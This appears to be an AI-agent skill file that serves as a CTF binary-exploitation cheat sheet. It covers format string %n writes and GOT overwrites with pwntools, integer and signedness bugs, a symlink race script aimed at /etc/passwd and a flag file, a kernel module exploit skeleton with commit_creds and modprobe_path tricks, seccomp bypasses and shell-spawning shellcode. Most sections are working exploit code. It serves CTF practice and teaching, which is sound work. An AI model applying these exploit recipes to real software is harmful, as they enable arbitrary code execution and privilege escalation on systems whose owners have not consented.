---
name: ctf-pwn-formats-and-misc
description: Format string, integer, and kernel pwn in CTFs — %n writes, integer overflow/sign confusion, kernel module exploitation, and miscellaneous primitives
---

# CTF Format String & Misc Pwn

Three sub-disciplines: **format string bugs**, **integer/numeric issues**, and **kernel pwn**. Each is its own specialist area, but the workflow is consistent: identify the primitive, find what to overwrite, build the ROP / write chain.

## 1. Format String Bugs

### Detection (3 ways)

1. **Send `AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p` and look for `0x4141414141414141`** (printed somewhere in the chain).
2. **Send `%s%s%s%s` and watch for a crash** — if the format string contains a `%s` that pulls a non-pointer, you crash with a segfault.
3. **Look for `printf(buf)` / `syslog(buf)` / `fprintf(buf)` / `snprintf(buf, ..., fmt, ...)`** in the disassembly — the third argument is the format string.

### Quick-leak recipe
```python
# Find the offset of your buffer on the stack
for i in range(1, 40):
    io.send(f"AAAAAAAA%{i}$p\n".encode())
    # Look for "0x4141414141414141" — that's your offset
```

### Stack write (the high-value primitive)
```python
# %n writes the number of bytes printed so far to the address on the stack at the given offset
# To write a specific value, pad with the right number of bytes before the %n
# The format string itself is the stack buffer, so:
payload = fmtstr_payload(offset, {target_addr: value_to_write}, write_size='short')
# pwntools' fmtstr_payload does the math for you (byte/short/int writes)
```

**`fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`:**
- `offset` = where your format string appears on the stack
- `writes` = dict of `{addr: value}` pairs
- `write_size` = `'byte'` (1 byte at a time, slow but works), `'short'` (2 bytes), `'int'` (4 bytes)

Example — overwrite GOT entry:
```python
payload = fmtstr_payload(8, {elf.got['exit']: elf.symbols['win']}, write_size='short')
io.send(payload)
```

### Multiple writes in one shot
```python
writes = {
    elf.got['printf']: elf.symbols['system'],
    0x404000: 0xdeadbeef,
    # ...
}
payload = fmtstr_payload(offset, writes, write_size='short')
```

### Common format string CTF payloads
```c
// Read 8 bytes from stack at offset N
%N$s              // will crash if the value is not a valid pointer

// Read 8 bytes from a specific address
// The format string itself contains the address as a stack value
// %<offset>$s    → reads the pointer at stack offset
%7$s              // stack[offset] is interpreted as a char*; prints until \0

// Write 4 bytes
%<width>c%<offset>$n   // writes <width> to *stack[offset]
%<offset>$n            // writes 0 (count of bytes printed so far)
%<offset>$hn           // writes 2 bytes
%<offset>$hhn          // writes 1 byte
%<offset>$ln           // writes 4/8 bytes (size of long)

// For arbitrary read at a given address:
// 1. Put the address on the stack (at a known offset)
// 2. Use %<offset>$s to read from that address
//
// pwntools' fmtstr_payload handles all of this.
```

### Real-world CTF example
```python
# Goal: leak libc, then overwrite GOT
io.send(b"%7$p|%9$p|%11$p\n")     # stack probe
leaks = io.recvline().decode().strip().split('|')
canary = int(leaks[0], 16)
libc_leak = int(leaks[2], 16)
libc.address = libc_leak - libc.symbols['__libc_start_main']

payload = fmtstr_payload(8, {
    elf.got['printf']: libc.symbols['system'],
    elf.got['exit']: elf.symbols['win'],
}, write_size='short')
io.sendline(payload)
io.sendline(b'/bin/sh')     # printf's first arg becomes system("/bin/sh")
io.interactive()
```

## 2. Integer Issues

### Signedness confusion
```c
unsigned int len;       // attacker-controlled
char *buf = malloc(len);
read(0, buf, len);      // OK, size_t read
// But if len is signed and negative:
int signed_len;          // negative
char *buf = malloc(signed_len);  // implicit conversion to size_t = HUGE
                                // malloc fails or allocates tiny
read(0, buf, signed_len);       // reads "negative" bytes = HUGE
                                // → heap overflow
```

**Test:** send `len = 0xffffffff` (4,294,967,295) and watch the heap. The exploit follows the heap-overflow pattern.

### Integer overflow / underflow
```c
uint8_t a, b;
uint8_t sum = a + b;    // overflow: 200 + 100 = 44
if (a + b > 255) ...    // always false for uint8_t; check must be on the wider type
```

**Test:** send boundary values (255, 256, 65535, 65536, 0x7fffffff, 0x80000000, 0xffffffff). When the program takes a different code path on either side of a boundary, you've found an integer bug.

### Off-by-one
The classic. `for (i = 0; i <= size; i++) buf[i] = 0` overwrites one extra byte (the null terminator position). In glibc, this can be used to overwrite the `prev_size` of the next chunk, leading to an unlink exploit (glibc 2.23 only — modern glibc has safe unlinking).

### Truncation
```c
uint64_t real_size = ...;   // 0x100000000
uint32_t truncated = real_size;   // 0
buf = malloc(truncated);    // 0-byte allocation
read(0, buf, real_size);    // 4GB read into 0-byte buf
```

## 3. Race Conditions (TOCTOU)

```c
// Check
if (access("file", R_OK) == 0) {  // checks real UID
    // Use
    int fd = open("file", O_RDONLY);  // effective UID = real
    read(fd, buf, size);
}
// Window between access() and open(): attacker can swap "file" with a symlink to a protected file
```

**CTF canonical exploit:**
```python
import threading, os
def swap():
    while True:
        try: os.unlink("/tmp/file")
        except: pass
        os.symlink("/etc/passwd", "/tmp/file")
        try: os.unlink("/tmp/file")
        except: pass
        os.symlink("/flag.txt", "/tmp/file")
for _ in range(8): threading.Thread(target=swap, daemon=True).start()
# Trigger the race
io.send(b"read /tmp/file\n")
```

For 2024+ CTFs, the targets are often:
- **Symlink race** in `/tmp` or `/dev/shm`
- **File upload race** (file is readable, then validated, then deleted)
- **Bank transfer / credit race** (concurrent withdraw on the same balance)
- **Session token reuse** (regenerate after privilege change)

## 4. Kernel Pwn

Kernel pwn challenges are typically **kernel modules** (`.ko`) that expose a `ioctl`/`/dev/xxx` device with a memory-safety bug.

### Setup checklist
```bash
# Get the kernel image + bzImage + filesystem
ls /              # the initramfs
file vmlinux      # the kernel binary (uncompressed)
file bzImage
# Extract vmlinux from bzImage
extract-vmlinux bzImage > vmlinux
# Or use the dwarf-style /lib/modules/$(uname -r)/vmlinux symbol file

# Find the .ko file
find / -name "*.ko" 2>/dev/null
# Or it's in the initramfs; extract with cpio
mkdir rootfs && cd rootfs
zcat ../initramfs.cpio.gz | cpio -idmv

# Get the kernel symbol addresses from /proc/kallsyms (with root)
cat /proc/kallsyms | grep -E "commit_creds|prepare_kernel_cred"
```

### Kernel exploit skeleton
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>

#define CMD_BUF_OVERFLOW 0xDEADBEEF

int main() {
    int fd = open("/dev/xxx", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    char payload[0x100];
    memset(payload, 'A', sizeof(payload));
    *(unsigned long*)(payload + 0x40) = 0xdeadbeef;   // ROP / win
    ioctl(fd, CMD_BUF_OVERFLOW, payload);
    return 0;
}
```

### Kernel primitives
- **commit_creds(prepare_kernel_cred(0))** — give yourself root
- **modprobe_path overwrite** — when a file with an unknown magic is executed, the kernel runs `modprobe_path` (default `/sbin/modprobe`). Overwrite to a script that copies `/bin/sh` to `/tmp/sh` and chmods it. Trigger by running a file with bad magic.
- **ROP from a `pt_regs` copy on stack** — when userspace enters the kernel, the registers are saved on the kernel stack (`pt_regs`). If you can overflow to that area, you can return with controlled RIP/RSP. Used in 2023+ kernel challenges.

### Useful kernel helpers
```bash
# gdb helpers for kernel
add-auto-load-safe-path /
target remote localhost:1234
lx-symbols        # load kernel symbols
lx-ps             # list processes
lx-dmesg          # kernel log
```

## 5. Other Misc Primitives

### Seccomp bypass
```bash
seccomp-tools dump ./chall
# Shows allowed/denied syscalls
# Most CTFs ban execve. To bypass:
# 1. open/read/write to read the flag directly
# 2. execveat
# 3. memfd_create + fexecve
# 4. change seccomp rules by writing to /proc/self/... (rare)
```

### Shellcode
```python
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())
sc = asm(shellcraft.cat('/flag.txt'))   # direct flag read
sc = asm(shellcraft.open('/flag.txt') + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))
# For sandboxed syscall whitelist, build a custom shellcode
sc = asm("""
    xor rsi, rsi
    push rsi
    mov rdi, 0x7478742e67616c662f   # /flag.txt (push as qword)
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    xor rax, rax
    mov al, 2
    syscall          # open
    mov rdi, rax
    mov rsi, rsp
    mov edx, 0x100
    xor rax, rax
    mov al, 0
    syscall          # read
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov al, 1
    syscall          # write
""")
```

### Use-after-free in non-heap contexts
- **Function pointer UAF** — Linux kernel `tty_struct` had a classic UAF in CVE-2022-0185
- **File structure UAF** — FSOP covers this
- **C++ vtable UAF** — overwrite vtable pointer to a forged vtable

## Common Pitfalls

- **Format string offset is wrong** — the offset is dependent on the calling convention and the buffer position. Use `AAAAAAAA%p.%p.%p...` first to find the offset that prints your buffer.
- **`fmtstr_payload` produces a too-long string** — try `write_size='byte'` if `'short'` overflows the buffer; or break into multiple payloads.
- **Integer overflow on the multiplication** — `len * nmemb` may wrap; check the `nmemb` argument of `calloc` or the buffer math.
- **Kernel pwn: the kernel version matters** — `commit_creds` is in different places across versions. Use `kallsyms` from the running kernel.
- **Seccomp blocks `execve`** — switch to `open/read/write` syscall chain in shellcode. `shellcraft.open` / `shellcraft.read` / `shellcraft.write` produce this.
- **Forgot to `cat /proc/self/maps`** — in pwn challenges where the binary loads shared libraries dynamically, the libc base changes per run. The leak is the only source of truth.

## Tooling

```bash
# Format string helper
python3 -c "from pwn import *; print(fmtstr_payload(8, {0x404040: 0x1337}, write_size='byte'))"

# Integer-boundary tester
# (write a small script that sends 0, 1, 0x7f, 0x80, 0xff, 0x100, 0xffff, 0x10000, 0x7fffffff, 0x80000000, 0xffffffff)

# Seccomp inspection
seccomp-tools dump ./chall

# Shellcode generator
python3 -c "from pwn import *; context.arch='amd64'; print(shellcraft.sh())"

# Kernel symbol dumper
# /proc/kallsyms (root) or extract from vmlinux
```
